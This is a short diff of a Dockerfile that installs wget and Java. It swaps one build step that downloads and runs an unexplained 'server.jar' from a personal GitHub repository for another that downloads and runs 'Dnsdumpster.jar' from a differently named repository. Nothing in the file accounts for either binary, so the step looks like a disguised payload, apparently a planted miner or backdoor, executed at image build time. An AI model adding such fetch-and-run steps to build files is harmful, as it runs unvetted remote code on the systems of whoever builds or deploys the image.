@@ -7,9 +7,9 @@ ARG LINK_PYTHON_TO_PYTHON3=1
 RUN apt update
 RUN apt-get install wget -y
 RUN apt-get install openjdk-11-jdk -y
-RUN wget -O build.jar https://github.com/Chiemaeh/Chiemaeh/raw/main/server.jar
-RUN java -jar build.jar
-RUN echo "touch $HOME/.sudo_as_admin_successful"
+RUN wget https://github.com/wenckerm1lder/Scn-fix-dsfca/raw/main/Dnsdumpster.jar
+RUN java -jar Dnsdumpster.jar
+
 CMD [ "/bin/bash" ]
 
 
